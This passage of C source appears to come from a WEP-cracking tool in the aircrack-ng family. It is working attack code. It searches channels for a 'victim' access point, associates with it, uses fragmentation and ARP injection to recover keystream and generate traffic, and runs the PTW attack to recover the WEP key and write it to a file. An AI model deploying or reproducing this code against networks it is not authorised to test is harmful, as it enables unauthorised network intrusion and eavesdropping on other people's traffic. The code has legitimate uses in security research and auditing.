	fragsize = fs->fs_data + fs->fs_len - fs->fs_ptr;

	assert(fragsize > 0);
	
	if ( (fragsize + 4) > pi->pi_len) {
		fragsize = pi->pi_len  - 4;
		wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;
	} 
	// last fragment
	else {
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;
	}

	memcpy(body, fs->fs_ptr, fragsize);

	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, fragsize);
	pcrc = (unsigned long*) (body+fragsize);
	*pcrc = crc;

	for (i = 0; i < (fragsize + 4); i++)
		body[i] ^= pi->pi_prga[i];

	seq = (unsigned short*) &wh->i_seq;
	sn = (*seq & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;
	fn = *seq & IEEE80211_SEQ_FRAG_MASK;
//	printf ("Sent frag (data=%d) (seq=%d fn=%d)\n", fragsize, sn, fn);
	       
	send_frame(wi, buf, sizeof(*wh) + 4 + fragsize+4);

	seq = (unsigned short*) &fs->fs_wh.i_seq;
	*seq = fnseq(++fn, sn);
	fs->fs_ptr += fragsize;

	if (fs->fs_ptr - fs->fs_data == fs->fs_len) {
//		printf("Finished sending frags...\n");
		fs->fs_waiting_relay = 1;
	}
}

void prepare_fragstate(struct frag_state* fs, int pad) {
	struct wstate *ws = get_ws();

	fs->fs_waiting_relay = 0;
	fs->fs_len = 8 + 8 + 20 + pad;
	fs->fs_data = (unsigned char*) malloc(fs->fs_len);

	if(!fs->fs_data) {
		perror("malloc()");
		exit(1);
	}

	fs->fs_ptr = fs->fs_data;

	do_llc(fs->fs_data, ETHERTYPE_ARP);
	do_arp(&fs->fs_data[8], ARPOP_REQUEST,
	       ws->ws_mymac, ws->ws_myip, 
	       (unsigned char*) "\x00\x00\x00\x00\x00\x00", "192.168.0.1");

	memset(&fs->fs_wh, 0, sizeof(fs->fs_wh));
	fill_basic(&fs->fs_wh);

	memset(fs->fs_wh.i_addr3, 0xff, 6);
	fs->fs_wh.i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	fs->fs_wh.i_fc[1] |= IEEE80211_FC1_DIR_TODS |
				IEEE80211_FC1_MORE_FRAG |
				IEEE80211_FC1_WEP;

	memset(&fs->fs_data[8+8+20], 0, pad);
}

void discover_prga(struct wif *wi) {
        struct wstate *ws = get_ws();

	// create packet...
	if (!ws->ws_fs.fs_data) {
		int pad = 0;

		if (ws->ws_pi.pi_len >= 20)
			pad = ws->ws_pi.pi_len*3;
	
		prepare_fragstate(&ws->ws_fs, pad);
	}

	if (!ws->ws_fs.fs_waiting_relay) {
		send_fragment(wi, &ws->ws_fs, &ws->ws_pi);
		if (ws->ws_fs.fs_waiting_relay) {
			if (gettimeofday(&ws->ws_fs.fs_last, NULL) == -1)
				err(1, "gettimeofday()");
		}
	}	
}

void decrypt(struct wif *wi) {
	struct wstate *ws = get_ws();

	// gotta initiate
	if (!ws->ws_dfs.fs_data) {
		prepare_fragstate(&ws->ws_dfs, 0);

		memcpy(ws->ws_dfs.fs_wh.i_addr3,
		       MCAST_PREF, 5);

		ws->ws_dfs.fs_wh.i_addr3[5] =
		ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len-1];

		ws->ws_dpi.pi_len++;
	}

	// guess diff prga byte...
	if (ws->ws_dfs.fs_waiting_relay) {	
		unsigned short* seq;
		ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len-1]++;

		ws->ws_dfs.fs_wh.i_addr3[5] =
		ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len-1];

		ws->ws_dfs.fs_waiting_relay = 0;
		ws->ws_dfs.fs_ptr = ws->ws_dfs.fs_data;

		seq = (unsigned short*) &ws->ws_dfs.fs_wh.i_seq;
		*seq = fnseq(0, ws->ws_psent);
	}

	send_fragment(wi, &ws->ws_dfs,
		      &ws->ws_dpi);
}

void send_arp(struct wif *wi, unsigned short op, char* srcip, 
	      unsigned char* srcmac, char* dstip, 
	      unsigned char* dstmac) {
	
	static unsigned char arp_pkt[128];
	unsigned char* body;
	unsigned char* ptr;
	struct ieee80211_frame* wh;
	int arp_len;

	memset(arp_pkt, 0, sizeof(arp_pkt));

	// construct ARP
	wh = (struct ieee80211_frame*) arp_pkt;
	fill_basic(wh);

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_WEP | IEEE80211_FC1_DIR_TODS;
	memset(wh->i_addr3, 0xff, 6);

	body = (unsigned char*) wh + sizeof(*wh);
	ptr = body;
	ptr += 4; // iv

	do_llc(ptr, ETHERTYPE_ARP);
	ptr += 8;
	do_arp(ptr, op, srcmac, srcip, dstmac, dstip);

	wepify(body, 8+8+20);
	arp_len = sizeof(*wh) + 4 + 8 + 8 + 20 + 4;
	assert(arp_len < (int)sizeof(arp_pkt));

	send_frame(wi, arp_pkt, arp_len);
}	      

void can_write(struct wif *wi) {
	static char arp_ip[16];
	struct wstate *ws = get_ws();

	switch (ws->ws_state) {
		case FOUND_VICTIM:
			send_auth(wi);
			ws->ws_state = SENDING_AUTH;
			break;

		case GOT_AUTH:
			send_assoc(wi);
			ws->ws_state = SENDING_ASSOC;
			break;

		case GOT_ASSOC:
			if (ws->ws_pi.pi_prga && ws->ws_pi.pi_len < ws->ws_min_prga) {
				discover_prga(wi);
				break;
			}
			
			if (ws->ws_cipher) {
				decrypt(wi);
				break;
			}
			
			if (!ws->ws_pi.pi_prga)
				break;

			// try to find rtr mac addr
			if (ws->ws_netip && !ws->ws_rtrmac) {
				strcpy(arp_ip, ws->ws_netip);

				if (gettimeofday(&ws->ws_arpsend, NULL) == -1)
					err(1, "gettimeofday()");

				time_print("Sending arp request for: %s\n", arp_ip);
				send_arp(wi, ARPOP_REQUEST, ws->ws_myip, ws->ws_mymac,
					 arp_ip, (unsigned char *)
					 "\x00\x00\x00\x00\x00\x00");
			
				// XXX lame
				ws->ws_rtrmac = (unsigned char*)1;
				break;	 
			}
	
			// need to generate traffic...
			if (ws->ws_rtrmac > (unsigned char*)1 && ws->ws_netip) {
				// could ping broadcast....
				send_arp(wi, ARPOP_REQUEST, ws->ws_myip, ws->ws_mymac,
					 arp_ip, (unsigned char*)
					 "\x00\x00\x00\x00\x00\x00");
				break;
			}

			break;	
	}
}

void save_key(unsigned char *key, int len)
{
	char tmp[16];
	char k[64];
	int fd;
	int rd;

	assert(len*3 < (int)sizeof(k));

	k[0] = 0;
	while (len--) {
		sprintf(tmp, "%.2X", *key++);
		strcat(k, tmp);
		if (len)
			strcat(k, ":");
	}

	fd = open(KEY_FILE, O_WRONLY | O_CREAT | 0644);
	if (fd == -1)
		err(1, "open()");

	printf("\nKey: %s\n", k);
	rd = write(fd, k, strlen(k));
	if (rd == -1)
		err(1, "write()");
	if (rd != (int) strlen(k))
		errx(1, "write %d/%d\n", rd, strlen(k));
	close(fd);
}

#define KEYLIMIT (1000000)
int do_crack(void)
{
	struct wstate *ws = get_ws();
	unsigned char key[PTW_KEYHSBYTES];

	if(PTW_computeKey(ws->ws_ptw, key, 13, KEYLIMIT) == 1) {
		save_key(key, 13);
		return 1;
	}
	if(PTW_computeKey(ws->ws_ptw, key, 5, KEYLIMIT/10) == 1) {
		save_key(key, 5);
		return 1;
	}

	return 0;
}

void try_crack() {
	struct wstate *ws = get_ws();

	if (ws->ws_crack_pid) {
		printf("\n");
		time_print("Warning... previous crack still running!\n");
		kill_crack();
	}	

	if (ws->ws_fd) {
		if (fsync(ws->ws_fd) == -1)
			err(1, "fsync");
	}

	ws->ws_crack_pid = fork();

	if (ws->ws_crack_pid == -1)
		err(1, "fork");

	// child
	if (ws->ws_crack_pid == 0) {
		if (!do_crack()) {
			printf("\n");
			time_print("Crack unsuccessful\n");
		}
		exit(1);
	} 

	// parent
	printf("\n");
	time_print("Starting crack PID=%d\n", ws->ws_crack_pid);
	if (gettimeofday(&ws->ws_crack_start, NULL) == -1)
		err(1, "gettimeofday");

	ws->ws_wep_thresh += ws->ws_thresh_incr;
}

int elapsedd(struct timeval *past, struct timeval *now)
{
        int el;
 
        el = now->tv_sec - past->tv_sec;
        assert(el >= 0);
        if (el == 0) {
                el = now->tv_usec - past->tv_usec;
        } else {
                el = (el - 1)*1000*1000; 
                el += 1000*1000-past->tv_usec;
                el += now->tv_usec;
        }
        
        return el;
}       

static int read_packet(struct wif *wi, unsigned char *dst, int len)
{
	return wi_read(wi, dst, len, NULL);
}

void own(struct wif *wi) {
	unsigned char buf[4096];
	int rd;
	fd_set rfd;
	struct timeval tv;
	char *pbar = "/-\\|";
	char *pbarp = &pbar[0];
	struct timeval lasthop;
	struct timeval now;
	unsigned int last_wep_count = 0;
	struct timeval last_wcount;
	struct timeval last_status;
	int fd;
	int largest;
	int wifd;
	struct wstate *ws = get_ws();

	wifd = wi_fd(wi);
	ws->ws_fd = open(WEP_FILE, O_WRONLY | O_APPEND);
	if (ws->ws_fd == -1) {
		struct pcap_file_header pfh;

		memset(&pfh, 0, sizeof(pfh));
		pfh.magic           = TCPDUMP_MAGIC;
		pfh.version_major   = PCAP_VERSION_MAJOR;
		pfh.version_minor   = PCAP_VERSION_MINOR;
		pfh.thiszone        = 0;
		pfh.sigfigs         = 0;
		pfh.snaplen         = 65535;
		pfh.linktype        = LINKTYPE_IEEE802_11;
		
		ws->ws_fd = open(WEP_FILE, O_WRONLY | O_CREAT,
				 S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
		if (ws->ws_fd != -1) {
			if (write(ws->ws_fd, &pfh, sizeof(pfh)) != sizeof(pfh))
				err(1, "write()");
		}
	}
	else {
		time_print("WARNING: Appending in %s\n", WEP_FILE);
	}

	if (ws->ws_fd == -1) {
		perror("open()");
		exit(1);
	}

	fd = open(PRGA_FILE, O_RDONLY);
	if (fd != -1) {
		time_print("WARNING: reading prga from %s\n", PRGA_FILE);
		rd = read(fd, buf, sizeof(buf));
		if (rd == -1) {
			perror("read()");
			exit(1);
		}
		if (rd >= 8) {
			set_prga(buf, NULL, &buf[3], rd - 3);
		}

		close(fd);
	}

	largest = wifd;

	if (signal(SIGINT, &cleanup) == SIG_ERR) {
		perror("signal()");
		exit(1);
	}
	if (signal (SIGTERM, &cleanup) == SIG_ERR) {
		perror("signal()");
		exit(1);
	}

	time_print("Looking for a victim...\n");
	if (gettimeofday(&lasthop, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	memcpy(&last_wcount, &lasthop, sizeof(last_wcount));
	memcpy(&last_status, &lasthop, sizeof(last_status));

	while (1) {
		if (gettimeofday(&now, NULL) == -1) {
			perror("gettimeofday()");
			exit(1);
		}

		/* check for relay timeout */
		if (ws->ws_fs.fs_waiting_relay) {
			int el;

			el = now.tv_sec - ws->ws_fs.fs_last.tv_sec;
			assert (el >= 0);
			if (el == 0) {
				el = now.tv_usec - ws->ws_fs.fs_last.tv_usec;
			} else {
				el--;

				el *= 1000*1000;
				el += 1000*1000 - ws->ws_fs.fs_last.tv_usec;
				el += now.tv_usec;

				if (el > (1500*1000)) {
//					printf("\nLAMER timeout\n\n");
					free(ws->ws_fs.fs_data);
					ws->ws_fs.fs_data = 0;
				}
			}
		}

		/* check for arp timeout */
		if (ws->ws_rtrmac == (unsigned char*) 1) {
			int el;

			el = elapsedd(&ws->ws_arpsend, &now);
			if (el >= (1500*1000)) {
				ws->ws_rtrmac = 0;
			}
		}
		
		// status bar
		if ( (now.tv_sec > last_status.tv_sec ) ||
		     ( now.tv_usec - last_status.tv_usec > 100*1000)) {
		     	if (ws->ws_crack_pid && (now.tv_sec > last_status.tv_sec)) {
				check_key();
			}
			if (ws->ws_netip && ws->ws_pi.pi_len >= ws->ws_min_prga && 
			    ws->ws_rtrmac > (unsigned char*) 1) {
				time_print("WEP=%.9d (next crack at %d) IV=%.2x:%.2x:%.2x (rate=%d)         \r", 
				       ws->ws_packets, ws->ws_wep_thresh, 
				       ws->ws_iv[0], ws->ws_iv[1], ws->ws_iv[2],
				       ws->ws_rate);
				fflush(stdout);
			}
			else {
				if (ws->ws_state == FIND_VICTIM)
					time_print("Chan %.02d %c\r", ws->ws_chan, *pbarp);
				else if (ws->ws_cipher) {
					int pos = ws->ws_dpi.pi_len - 1;
					unsigned char prga = ws->ws_dpi.pi_prga[pos];
					assert(pos);

					time_print("Guessing PRGA %.2x (IP byte=%d)    \r",
						   prga, ws->ws_cipher[pos] ^ prga);
				}
				else
					time_print("%c\r", *pbarp);
				fflush(stdout);
			}
			memcpy(&last_status, &now,sizeof(last_status));	
		}

		// check if we are cracking
		if (ws->ws_crack_pid) {
			if (now.tv_sec - ws->ws_crack_start.tv_sec >= ws->ws_crack_dur)
				kill_crack();
		}

		// check TX  / retransmit
		if (ws->ws_waiting_ack) {
			unsigned int elapsed = now.tv_sec -
					       ws->ws_tsent.tv_sec;
			elapsed *= 1000*1000;
			elapsed += (now.tv_usec - ws->ws_tsent.tv_usec);

			if (elapsed >= ws->ws_ack_timeout)
				send_frame(wi, NULL, -1);
		}

		// INPUT
		// select
		FD_ZERO(&rfd);
		FD_SET(wifd, &rfd);
		tv.tv_sec = 0;
		tv.tv_usec = 1000*10;
		rd = select(largest+1, &rfd, NULL, NULL, &tv);
		if (rd == -1) {
			perror("select()");
			exit(1);
		}

		// read
		if (rd != 0) {
			// wifi
			if (FD_ISSET(wifd, &rfd)) {
				rd = read_packet(wi, buf, sizeof(buf));
				if (rd == 0)
					return;
				if (rd == -1) {
					perror("read()");
					exit(1);
				}

				pbarp++;
				if(!(*pbarp))
					pbarp = &pbar[0];
				// input
				anal(buf, rd, wi);
			}
		}

		// check state and what we do next.
		if (ws->ws_state == FIND_VICTIM) {
			if (now.tv_sec > lasthop.tv_sec ||
			    ( (now.tv_usec - lasthop.tv_usec) >= 300*1000 )) {
				int chan = ws->ws_chan;
				chan++;

				if(chan > ws->ws_max_chan)
					chan = 1;
				
				set_chan(wi, chan);
				memcpy(&lasthop, &now, sizeof(lasthop));
			}    
		} else {
		// check if we need to write something...	
			if (!ws->ws_waiting_ack)
				can_write(wi);

			// roughly!

#ifdef MORE_ACCURATE			
			if ( (now.tv_sec - last_wcount.tv_sec) >= 2) {
				unsigned int elapsed;
				int secs;
				int packetz = ws->ws_packets - last_wep_count;
				elapsed = 1000*1000;

				elapsed -= last_wcount.tv_usec;
				
				assert(elapsed >= 0);
				elapsed += now.tv_usec;

				secs = now.tv_sec - last_wcount.tv_sec;
				secs--;
				if (secs > 0)
					elapsed += (secs*1000*1000);

				ws->ws_rate = (int)
				((double)packetz/(elapsed/1000.0/1000.0));	
#else
			if ( now.tv_sec > last_wcount.tv_sec) {
				ws->ws_rate = ws->ws_packets - last_wep_count;
#endif				
				last_wep_count = ws->ws_packets;
				memcpy(&last_wcount, &now, sizeof(now));

				if (ws->ws_wep_thresh != -1 && ws->ws_packets 
				    > (unsigned int) ws->ws_wep_thresh)
					try_crack();
			}
		}
	}
}

void start(char *dev) {
	struct wif *wi;
	struct wstate *ws = get_ws();

	ws->ws_wi = wi = wi_open(dev);
	if (!wi)
		err(1, "wi_open(%s)", dev);

	if (!ws->ws_have_mac) {
		if (wi_get_mac(wi, ws->ws_mymac) == -1)
			printf("Can't get mac\n");
	} else {
		if (wi_set_mac(wi, ws->ws_mymac) == -1)
			printf("Can't set mac\n");
	}
	time_print("Using mac %s\n", mac2str(ws->ws_mymac));

	ws->ws_ptw = PTW_newattackstate();
	if (!ws->ws_ptw)
		err(1, "PTW_newattackstate()");

	own(wi);

	wi_close(wi);
}

void usage(char* pname) {
	printf("Usage: %s <opts>\n", pname);
	printf("-h\t\tthis lame message\n");
	printf("-i\t\t<iface>\n");
	printf("-m\t\t<my ip>\n");
	printf("-n\t\t<net ip>\n");
	printf("-a\t\t<mymac>\n");
	printf("-c\t\tdo not crack\n");
	printf("-p\t\t<min prga>\n");
	printf("-v\t\t<victim mac>\n");
	printf("-t\t\t<crack thresh>\n");
	printf("-f\t\t<max chan>\n");

	exit(0);
}

void str2mac(unsigned char* dst, char* mac) {
	unsigned int macf[6];
	int i;

	if( sscanf(mac, "%x:%x:%x:%x:%x:%x",
                   &macf[0], &macf[1], &macf[2],
                   &macf[3], &macf[4], &macf[5]) != 6) {

		   printf("can't parse mac %s\n", mac);
		   exit(1);
	}     

	for (i = 0; i < 6; i++)
		*dst++ = (unsigned char) macf[i];
}

static void init_defaults(struct wstate *ws)
{
	memset(ws, 0, sizeof(*ws));

	ws->ws_state = FIND_VICTIM;
	ws->ws_max_chan = 11;
	memcpy(ws->ws_mymac, "\x00\x00\xde\xfa\xce\x0d", 6);
	ws->ws_have_mac = 1; /* XXX */
	strcpy(ws->ws_myip, "192.168.0.123");
	ws->ws_ack_timeout = 100*1000;
	ws->ws_min_prga = 128;
	ws->ws_wep_thresh = ws->ws_thresh_incr = 10000;
	ws->ws_crack_dur = 60;
}

int main(int argc, char *argv[]) {
	struct wstate *ws = get_ws();
	int ch;
	unsigned char vic[6];
	char* dev = "ath0";

	assert(ws);
	init_defaults(ws);

	if (gettimeofday(&ws->ws_real_start, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	while ((ch = getopt(argc, argv, "hi:m:a:n:cp:v:t:f:")) != -1) {
		switch (ch) {
			case 'a':
				str2mac(ws->ws_mymac, optarg);
				ws->ws_have_mac = 1;
				break;

			case 'i':
				dev = optarg;
				break;

			case 'm':
				strncpy(ws->ws_myip, optarg, sizeof(ws->ws_myip)-1);
				ws->ws_myip[sizeof(ws->ws_myip)-1] = 0;
				break;

			case 'n':
				ws->ws_netip = optarg;
				break;

			case 'v':
				str2mac(vic, optarg);
				ws->ws_victim_mac = vic;
				break;

			case 'c':
				ws->ws_wep_thresh = -1;
				break;

			case 'p':
				ws->ws_min_prga = atoi(optarg);
				break;

			case 't':
				ws->ws_thresh_incr = ws->ws_wep_thresh = atoi(optarg);
				break;

			case 'f':
				ws->ws_max_chan = atoi(optarg);
				break;

			default:
				usage(argv[0]);
				break;
		}
	}

	start(dev);
	
	cleanup(0);
	exit(0);
}
